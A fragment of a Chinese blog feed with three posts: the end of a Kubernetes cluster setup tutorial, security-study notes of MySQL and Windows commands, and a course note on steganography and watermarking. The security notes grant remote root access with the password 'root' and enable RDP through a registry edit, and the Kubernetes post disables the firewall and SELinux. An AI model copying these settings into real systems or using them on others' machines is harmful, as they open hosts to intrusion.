registry.cn-beijing.aliyuncs.com&#x2F;imctoimageRepository: registry.cn-beijing.aliyuncs.com&#x2F;imcto# 修改kubernetes版本kubernetesVersion: v1.13.0# 改为kubernetesVersion: v1.13.1kubernetesVersion: v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>修改<code>kubeadm.conf</code>中的API服务器地址，后面会频繁使用这个地址。</li></ol><ul><li>localAPIEndpoint:</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">localAPIEndpoint:  advertiseAddress: 192.168.236.177  bindPort: 6443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意: <code>192.168.236.177</code>是master主机的ip地址</p></blockquote><ol start="4"><li>配置子网网络</li></ol><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">networking:  dnsDomain: cluster.local  podSubnet: 10.244.0.0&#x2F;16  serviceSubnet: 10.96.0.0&#x2F;12scheduler: &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>10.244.0.0/16</code> 和 <code>10.96.0.0/12</code>分别是k8s内部pods和services的子网网络，最好使用这个地址，后续flannel网络需要用到。</p><h5 id="5-3-3-拉取K8s必备的模块镜像"><a href="#5-3-3-拉取K8s必备的模块镜像" class="headerlink" title="5.3.3 拉取K8s必备的模块镜像"></a>5.3.3 拉取K8s必备的模块镜像</h5><ol><li>查看一下都需要哪些镜像文件需要拉取</li></ol><pre class="line-numbers language-none"><code class="language-none">$ kubeadm config images list --config kubeadm.confregistry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-apiserver:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-controller-manager:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-scheduler:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;kube-proxy:v1.13.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;pause:3.1registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;etcd:3.2.24registry.cn-beijing.aliyuncs.com&#x2F;imcto&#x2F;coredns:1.2.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>拉取镜像</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#下载全部当前版本的k8s所关联的镜像kubeadm config images pull --config .&#x2F;kubeadm.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="5-3-4-初始化kubernetes环境"><a href="#5-3-4-初始化kubernetes环境" class="headerlink" title="5.3.4 初始化kubernetes环境"></a>5.3.4 初始化kubernetes环境</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#初始化并且启动$ sudo kubeadm init --config .&#x2F;kubeadm.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>更多kubeadm配置文件参数详见</p><pre class="line-numbers language-none"><code class="language-none">kubeadm config print-defaults<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>k8s启动成功输出内容较多，但是记住末尾的内容</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Your Kubernetes master has initialized successfully!To start using your cluster, you need to run the following as a regular user:  mkdir -p $HOME&#x2F;.kube  sudo cp -i &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config  sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;configYou should now deploy a pod network to the cluster.Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:  https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;cluster-administration&#x2F;addons&#x2F;You can now join any number of machines by running the following on each nodeas root:  kubeadm join 192.168.236.177:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:e778d3665e52f5a680a87b00c6d54df726c2eda601c0db3bfa4bb198af2262a8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照官方提示，执行以下操作。</p><ol><li><p>执行如下命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ mkdir -p $HOME&#x2F;.kube$ sudo cp -i &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config$ sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>创建系统服务并启动</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 启动kubelet 设置为开机自启动$ sudo systemctl enable kubelet# 启动k8s服务程序$ sudo systemctl start kubelet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h5 id="5-3-5-验证kubernetes启动结果"><a href="#5-3-5-验证kubernetes启动结果" class="headerlink" title="5.3.5 验证kubernetes启动结果"></a>5.3.5 验证kubernetes启动结果</h5><ol><li>验证输入，注意显示master状态是<code>NotReady</code>，证明初始化服务器成功</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ kubectl get nodesNAME     STATUS     ROLES    AGE   VERSIONmaster   NotReady   master   12m   v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>查看当前k8s集群状态</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ kubectl get csNAME                 STATUS    MESSAGE              ERRORscheduler            Healthy   okcontroller-manager   Healthy   oketcd-0               Healthy   &#123;&quot;health&quot;: &quot;true&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目前只有一个master，还没有node，而且是NotReady状态，那么我们需要将node加入到master管理的集群中来。在加入之前，我们需要先配置k8s集群的内部通信网络，这里采用的是flannel网络。</p><h5 id="5-3-6-部署集群内部通信flannel网络"><a href="#5-3-6-部署集群内部通信flannel网络" class="headerlink" title="5.3.6 部署集群内部通信flannel网络"></a>5.3.6 部署集群内部通信flannel网络</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$cd $HOME&#x2F;working$wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;coreos&#x2F;flannel&#x2F;a70459be0084506e4ec919aa1c114638878db11b&#x2F;Documentation&#x2F;kube-flannel.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编辑这个文件，确保flannel网络是对的,找到<code> net-conf.json</code>标记的内容是否正确。</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">net-conf.json: |   &#123;     &quot;Network&quot;: &quot;10.244.0.0&#x2F;16&quot;,     &quot;Backend&quot;: &#123;       &quot;Type&quot;: &quot;vxlan&quot;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这个”10.244.0.0/16”和 ./kubeadm.conf中的podsubnet的地址要一致。</strong></p><p>应用当前flannel配置文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">itcast@master:~&#x2F;working$ kubectl apply -f kube-flannel.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出结果如下 </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@master:~&#x2F;working# kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;coreos&#x2F;flannel&#x2F;a70459be0084506e4ec919aa1c114638878db11b&#x2F;Documentation&#x2F;kube-flannel.ymlclusterrole.rbac.authorization.k8s.io&#x2F;flannel createdclusterrolebinding.rbac.authorization.k8s.io&#x2F;flannel createdserviceaccount&#x2F;flannel createdconfigmap&#x2F;kube-flannel-cfg createddaemonset.extensions&#x2F;kube-flannel-ds-amd64 createddaemonset.extensions&#x2F;kube-flannel-ds-arm64 createddaemonset.extensions&#x2F;kube-flannel-ds-arm createddaemonset.extensions&#x2F;kube-flannel-ds-ppc64le createddaemonset.extensions&#x2F;kube-flannel-ds-s390x created<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装flannel网络前 执行<code>kubectl get nodes</code>输出结果如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@master:~&#x2F;working$ kubectl get nodeNAME     STATUS     ROLES    AGE   VERSIONmaster   NotReady   master   10m   v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装flannel网络后 执行<code>kubectl get nodes</code>输出结果如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@master:~&#x2F;working$ kubectl get nodeNAME     STATUS   ROLES    AGE   VERSIONmaster   Ready    master   10m   v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时master已经是<code>Ready</code>状态了，表示已经配置成功了，那么我们就需要配置node来加入这个集群。</p><h4 id="5-4-配置Node"><a href="#5-4-配置Node" class="headerlink" title="5.4 配置Node"></a>5.4 配置Node</h4><h5 id="5-4-1-确认外部环境"><a href="#5-4-1-确认外部环境" class="headerlink" title="5.4.1 确认外部环境"></a>5.4.1 确认外部环境</h5><ol><li><p>确认关闭swap </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">apt install -y selinux-utilsswapoff -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>禁止selinux</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">setenforce 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>确认关闭防火墙</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ufw disable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h5 id="5-4-2-配置k8s集群的Node主机环境"><a href="#5-4-2-配置k8s集群的Node主机环境" class="headerlink" title="5.4.2 配置k8s集群的Node主机环境"></a>5.4.2 配置k8s集群的Node主机环境</h5><ol><li><p>启动k8s后台服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 启动kubelet 设置为开机自启动$ sudo systemctl enable kubelet# 启动k8s服务程序$ sudo systemctl start kubelet<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将master机器的<code>/etc/kubernetes/admin.conf</code>传到到node1和node2</p><p>登录<code>master</code>终端（我的没办法用scp命令，是找到之后从master复制到node1,node2）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#将admin.conf传递给node1sudo scp &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf itcast@192.168.236.178:&#x2F;home&#x2F;itcast&#x2F;#将admin.conf传递给node2sudo scp &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf itcast@192.168.236.179:&#x2F;home&#x2F;itcast&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>登录<code>node1</code>终端，创建基础kube配置文件环境</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mkdir -p $HOME&#x2F;.kube$ sudo cp -i $HOME&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config$ sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li>登录<code>node2</code>终端，创建基础kube配置文件环境</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mkdir -p $HOME&#x2F;.kube$ sudo cp -i $HOME&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config$ sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li><code>node1</code>和<code>node2</code>分别连接<code>master</code>加入master集群。这里用的是<code>kubeadm join</code>指令(**master生成的，node1,node2运行加入)</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ sudo kubeadm join 192.168.236.177:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:e778d3665e52f5a680a87b00c6d54df726c2eda601c0db3bfa4bb198af2262a8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里要注意，使用的hash应该是<code>master</code>主机 <code>kubeadm init</code>成功之后生成的hash码。</p><ol start="6"><li>应用两个node主机分别应用flannel网络（我的加入master之后就有网了）</li></ol><p>将<code>master</code>中的<code>kube-flannel.yml</code>分别传递给两个<code>node</code>节点.（我的没办法用scp命令，是找到之后从master复制到node1,node2）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#将kube-flannel.yml传递给node1sudo scp $HOME&#x2F;working&#x2F;kube-flannel.yml itcast@192.168.236.178:&#x2F;home&#x2F;itcast&#x2F;#将kube-flannel.yml传递给node2sudo scp $HOME&#x2F;working&#x2F;kube-flannel.yml itcast@192.168.236.179:&#x2F;home&#x2F;itcast&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>分别启动<code>flannel</code>网络</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@node1:~$ kubectl apply -f kube-flannel.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@node2:~$ kubectl apply -f kube-flannel.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>查看node是否已经加入到k8s集群中(需要等一段时间才能ready)</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@node2:~$ kubectl get nodesNAME     STATUS   ROLES    AGE     VERSIONmaster   Ready    master   35m     v1.13.1node1    Ready    &lt;none&gt;   2m23s   v1.13.1node2    Ready    &lt;none&gt;   40s     v1.13.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网安学习小知识</title>
      <link href="/2022/100426600.html"/>
      <url>/2022/100426600.html</url>
      
        <content type="html"><![CDATA[<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a><strong>mysql</strong></h2><h3 id="命令行查看mysql账号密码"><a href="#命令行查看mysql账号密码" class="headerlink" title="命令行查看mysql账号密码"></a>命令行查看mysql账号密码</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql -u root -pshow databases;use 数据库名;select * from users;sdexit #退出数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysql远程连接"><a href="#mysql远程连接" class="headerlink" title="mysql远程连接"></a>mysql远程连接</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql -u root -p(登录mysql)use &#96;mysql&#96;;grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; WITH GRANT OPTION;(GRANT ALL PRIVILEGES ON *.* TO &#39;myuser&#39;@&#39;your ip&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION;FLUSH PRIVILEGES;)flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysql建表查表操作"><a href="#mysql建表查表操作" class="headerlink" title="mysql建表查表操作"></a>mysql建表查表操作</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;查看当前数据库的所有表名show tables;show tables from 数据库名;&#x2F;&#x2F;在当前数据库中添加表create table 表名(&#x2F;&#x2F;列名 字符格式 约束&#x2F;&#x2F;注意末尾加逗号，最后一列末尾除外uid int(32) primary,uname varchar(32) ,upassword varchar(32));&#x2F;&#x2F;查看表的结构desc 表名;&#x2F;&#x2F;添加表列&#x2F;&#x2F;alter table 表名 add 字段 字符格式 约束alter table user add unifo varchar(32) not null;&#x2F;&#x2F;修改表列alter table 表名 modify 列名 字符格式 约束&#x2F;&#x2F;修改表名alter table 表名  change 旧列名 新列名 新字符格式 新约束&#x2F;&#x2F;重命名rename table 旧表名 to 新表名&#x2F;&#x2F;插入单行数据insert into 表名 VALUES(&#39;1&#39;,&#39;java&#39;,&#39;34.4&#39;,&#39;7&#39;,&#39;张三&#39;);&#x2F;&#x2F;插入多行数据insert into book(列名) VALUES(&#39;1&#39;,&#39;java&#39;,&#39;34.4&#39;,&#39;7&#39;,&#39;张三&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mysql查看端口是否被占用"><a href="#mysql查看端口是否被占用" class="headerlink" title="mysql查看端口是否被占用"></a>mysql查看端口是否被占用</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">netstat -a -n  显示各个端口占用netstat -ano   显示各个端口占用和进程PIDnetstat -aon|findstr &quot;3306&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="mysql服务的停止和启用"><a href="#mysql服务的停止和启用" class="headerlink" title="mysql服务的停止和启用"></a>mysql服务的停止和启用</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">net stop mysql 暂停mysqlnet start mysql 启用mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="mysql导出查询"><a href="#mysql导出查询" class="headerlink" title="mysql导出查询"></a>mysql导出查询</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;导出目录查询select @@basedir;&#x2F;&#x2F;导出数据查询select @@datadir;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="windows开启rdp远程桌面服务"><a href="#windows开启rdp远程桌面服务" class="headerlink" title="windows开启rdp远程桌面服务"></a>windows开启rdp远程桌面服务</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查看远程端口或者使用注册表REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber再set &#x2F;a a&#x3D;0xd3d当远程桌面服务被关闭时，可以用注册表命令开启REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">win+R（调出命令行）mstsc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="windows常用命令"><a href="#windows常用命令" class="headerlink" title="windows常用命令"></a>windows常用命令</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;命令调出计算机管理win+Rcompmgmt.msc&#x2F;&#x2F;打开管理员命令行win+X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>大三上课程</title>
      <link href="/2022/09062913.html"/>
      <url>/2022/09062913.html</url>
      
        <content type="html"><![CDATA[<h1 id="大三上课程"><a href="#大三上课程" class="headerlink" title="大三上课程"></a>大三上课程</h1><h2 id="信息隐藏"><a href="#信息隐藏" class="headerlink" title="信息隐藏"></a>信息隐藏</h2><h3 id="2-1-2：基本知识"><a href="#2-1-2：基本知识" class="headerlink" title="2.1-2：基本知识"></a>2.1-2：基本知识</h3><p>​        信息隐藏技术的原理是在载体中隐藏隐秘信息，并通过钥匙提取隐秘信息，载体通常为图像、文本、视频、音频等。信息隐藏技术可以保证别有用心的人很难发现或者提取隐秘信息。当载体通过信道传输到接收器之后，接收器使用密钥恢复隐藏的机密信息。图1为信息隐藏系统模型，由4个主要部分组成：嵌入信息、提取信息、生成密钥和隐藏分析。</p><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\信息隐藏-1.png" alt="1"></p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ol><li><strong>隐蔽性</strong></li></ol><p>​        隐藏性是信息隐藏的基本要求，有两个方面：一是对人体感觉系统的不可感知性，通过在信息隐藏过程之后不会显著更改或降解载体，影响对载体信息的理解或引起视觉和听觉方面的明显变化，避免通过人类的感觉检测到。二是计算机之类的分析系统的不可预测性，还存在暴露的风险，因为信息被隐藏而未被人类识别，这并不意味着分析系统无法检测到该信息，这要求操作员在嵌入信息之前和之后尽量保持相同的特性，并且在计算机分析中不能确认信息是否被隐藏。</p><ol start="2"><li><strong>安全性</strong></li></ol><p>​        隐藏信息的内容是安全的，并且必须在加密后隐藏，即使第三方发现存在隐藏信息，没有钥匙也无法解密该信息。</p><ol start="3"><li><strong>鲁棒性</strong></li></ol><p>​        鲁棒性是指经过一系列处理或干扰后，载体中隐藏的信息不会被破坏，可以从中提取出完整的信息。这些处理和干扰包括重采样、有损压缩、模/数转换、滤波、信道噪声以及破坏信息的人为攻击。</p><ol start="4"><li><strong>自恢复性</strong></li></ol><p>​        即使在销毁数据之后，也需要能够基于其余数据独立于原始数据来还原原始隐藏数据。恢复损坏的数据非常重要，因为数据在传输、处理和转换后将不可避免地被破坏。</p><ol start="5"><li><strong>信息容量</strong></li></ol><p>​        信息容量指运营商必须具有一定数量的能力来保存机密信息。这与载体本身的特性、信息隐藏算法有关，并且取决于对机密信息的隐藏和鲁棒性的要求。随着机密信息量的增加，对运营商自身信息的影响和损害不可避免地增加，这增加了暴露的风险，同时降低了隐藏信息的鲁棒性。因此，在实际应用中，应该合理地选取隐蔽性、鲁棒性和信息容量。</p><h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><ul><li><strong>数字水印</strong></li></ul><p>​        数字水印是信息隐藏常用到的技术之一，可以在不影响载体的价值的条件下，将隐秘信息嵌入载体中。其优点之一就是不易被人类感知系统察觉到。数字水印主要有两种：空间数字水印和频率数字水印。空间数字水印的原理是通过改变表示数字图像颜色和调整数字图像的视觉上无关紧要的像素来实现水印信息的表示。频率数字水印的原理是根据时间频率分析和扩散频谱的特征选择数字图像频率区域中视觉最敏感的部分，以使修改后的系数包含数字水印信息。</p><p>​        <strong>替换、变换、扩频技术</strong></p><ul><li><strong>可视密码技术</strong></li></ul><p>​        1994年，Naor和Shamar提出了可视密码技术。可视密码技术的优势在于提取隐秘图像时不需要复杂的密码计算，可以根据人的视觉来区分。该方法制作n张无意义的胶卷，重叠其中的t张胶卷，能够恢复其中隐藏的机密信息。此后，人们对这种加密技术进行了改进，主要的改进方法如下：这使得制作的n张胶片具有特定的含义并且具有迷惑性。</p><ul><li><strong>潜信道</strong></li></ul><p>​        1978年，Gustavus J Simmons提出了潜信道的概念，随后进行了许多研究，其中潜信道是用于实现在公开信道中建立的秘密通信的信道。大多数数字签名方案包括潜信道通信，最大特征是潜信道包含在数字签名中，但是不影响数字签名过程。</p><ul><li><strong>隐匿协议</strong></li></ul><p>​        隐匿协议的原理是通过分析一方的业务量来识别另一方，可以确保通信信道不被他人窃听。隐秘通信通过在路由中使用多个加密层，保证路由的每一层处理不同的数据，可以使数据传输的路径很难被察觉到。隐秘通信的应用领域比较广泛，例如可以用于电子选举和电子现金的解决方案，防止选民或者购买者的身份暴露。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><ol><li><strong>隐秘信道</strong></li></ol><p>​        信息隐藏技术可以用于隐秘通信，将机密数据隐藏到多媒体信息中，通过网络进行发送，由于网络数据比较庞大，因此机密信息很难被检测到。信息隐藏技术与加密技术结合可以保证机密数据发送的安全性。第一，窃听者不清楚机密信息的通信过程，不能在大量的多媒体信息中找到隐藏的数据；第二，数据嵌入进行加密，确保数据安全性。</p><ol start="2"><li><strong>数字作品的版权保护</strong></li></ol><p>​        随着互联网技术的发展，数字作品的形式各种各样，包括数字图书馆、数字书籍出版、数字电视和数字新闻等。数字作品最重要的问题就是版权问题，数字水印技术可以很好地解决版权问题。数字水印以隐藏代码的形式添加到数字作品中，数字水印可以通过代码跟踪非法传播者。鉴于网络普遍存在的易于修改和易于复制的数字媒体的特点，信息隐藏技术可以将水印嵌入数字媒体中以保护版权。例如，为了追踪非法源，保护所有者权益，可以使用数字水印控制复印件，防止无限复制和盗版。</p><ol start="3"><li><strong>保护数据的完整性和真实性</strong></li></ol><p>​        在法律、医学、新闻和商业中应用数字媒体时，使用嵌入的水印来确定信息是否已被更改、伪造或经过特殊处理，以确定其完整性和真实性。例如，新闻采访中拍摄的照片应加水印以免被更改；司法机构使用的数字媒体还可以提取水印，以识别真伪并确定其法律效力。</p><ol start="4"><li><strong>广播监视</strong></li></ol><p>​        数字水印可以用于广播监视，将未压缩的视频进行MPEG-2压缩，使用安全密钥嵌入水印。嵌入的水印可以识别原始广播者和检测非法复制的内容。韩国广播公司技术研究所开发的水印系统可以保护数字电视内容的版权，其服务对象包括标清视频（SMPTE 259M）、高清视频（SMPTE 292 M）、DVD等媒体。标清视频嵌入的水印是64位版权标识符，高清视频嵌入的水印是128版权标识符，广播监视要求数字水印要有较高的不可见性和较好的鲁棒性，但是较高的不可察觉性要求水印强度低，较好的鲁棒性要求水印强度高，因此同时保证不可察觉性和鲁棒性，需要对水印强度进行折中考虑。</p><h4 id="图像文件的格式"><a href="#图像文件的格式" class="headerlink" title="图像文件的格式"></a>图像文件的格式</h4><ul><li>常见的存储的格式有 bmp，jpg，png，tif，gif，pcx，tga，exif，fpx，svg，psd，cdr，pcd，dxf，ufo，eps，ai，raw，WMF，webp，avif，apng 等。</li></ul><h4 id="音频文件的格式"><a href="#音频文件的格式" class="headerlink" title="音频文件的格式"></a>音频文件的格式</h4><ul><li>音频文件格式专指存放音频数据的文件的格式。</li><li>无损格式</li></ul><p>​        <a href="https://baike.baidu.com/item/WAV?fromModule=lemma_inlink">WAV</a>，<a href="https://baike.baidu.com/item/FLAC?fromModule=lemma_inlink">FLAC</a>，<a href="https://baike.baidu.com/item/APE?fromModule=lemma_inlink">APE</a>，<a href="https://baike.baidu.com/item/ALAC?fromModule=lemma_inlink">ALAC</a>，<a href="https://baike.baidu.com/item/WavPack?fromModule=lemma_inlink">WavPack</a>(WV)</p><ul><li>有损格式</li></ul><p>​        <a href="https://baike.baidu.com/item/MP3?fromModule=lemma_inlink">MP3</a>，<a href="https://baike.baidu.com/item/AAC?fromModule=lemma_inlink">AAC</a>，[Ogg Vorbis](<a href="https://baike.baidu.com/item/Ogg">https://baike.baidu.com/item/Ogg</a> Vorbis?fromModule=lemma_inlink)，<a href="https://baike.baidu.com/item/Opus?fromModule=lemma_inlink">Opus</a></p><h4 id="视频文件的格式"><a href="#视频文件的格式" class="headerlink" title="视频文件的格式"></a>视频文件的格式</h4><ul><li>视频文件格式是指视频保存的一种格式，视频是电脑中<a href="https://baike.baidu.com/item/%E5%A4%9A%E5%AA%92%E4%BD%93%E7%B3%BB%E7%BB%9F/700469?fromModule=lemma_inlink">多媒体系统</a>中的重要一环。为了适应储存视频的需要，人们设定了不同的视频文件格式来把视频和音频放在一个文件中，以方便同时回放。</li><li>微软视频</li></ul><p>​        <a href="https://baike.baidu.com/item/wmv?fromModule=lemma_inlink">wmv</a>、<a href="https://baike.baidu.com/item/asf?fromModule=lemma_inlink">asf</a>、<a href="https://baike.baidu.com/item/asx?fromModule=lemma_inlink">asx</a></p><ul><li>Real Player</li></ul><p>​        rm、 <a href="https://baike.baidu.com/item/rmvb?fromModule=lemma_inlink">rmvb</a></p><ul><li>MPEG视频</li></ul><p>​        <a href="https://baike.baidu.com/item/mp4?fromModule=lemma_inlink">mp4</a></p><ul><li>手机视频</li></ul><p>​        <a href="https://baike.baidu.com/item/3gp?fromModule=lemma_inlink">3gp</a></p><ul><li>Apple视频</li></ul><p>​        mov、<a href="https://baike.baidu.com/item/m4v?fromModule=lemma_inlink">m4v</a></p><ul><li>其他</li></ul><p>​        <a href="https://baike.baidu.com/item/avi?fromModule=lemma_inlink">avi</a>、<a href="https://baike.baidu.com/item/dat?fromModule=lemma_inlink">dat</a>、<a href="https://baike.baidu.com/item/mkv?fromModule=lemma_inlink">mkv</a>、<a href="https://baike.baidu.com/item/flv?fromModule=lemma_inlink">flv</a>、<a href="https://baike.baidu.com/item/vob?fromModule=lemma_inlink">vob</a>等</p><h4 id="图像信息隐藏的基本知识"><a href="#图像信息隐藏的基本知识" class="headerlink" title="图像信息隐藏的基本知识"></a>图像信息隐藏的基本知识</h4><ol><li>图像加密算法</li><li>图像信息隐藏技术的一些算法</li><li>实现嵌入提取</li></ol><h4 id="音频信息隐藏的基本知识"><a href="#音频信息隐藏的基本知识" class="headerlink" title="音频信息隐藏的基本知识"></a>音频信息隐藏的基本知识</h4><ol><li>如下图；音频信息隐藏系统通用系统模型分为三个部分：左边是发送端，即完成信息嵌入的过程；中间是信道传输，其包括嵌入信息后的音频信号经历噪音环境或数字攻击等过程；右边是接收端，经过同步后可以确定带噪音频信号嵌有隐藏信息的位置，从而解出隐蔽信息。</li></ol><p><img src="/2022/09062913/BLOG/hexoblog\source_posts\大三上课程\信息隐藏-2.png" alt="2"></p><h4 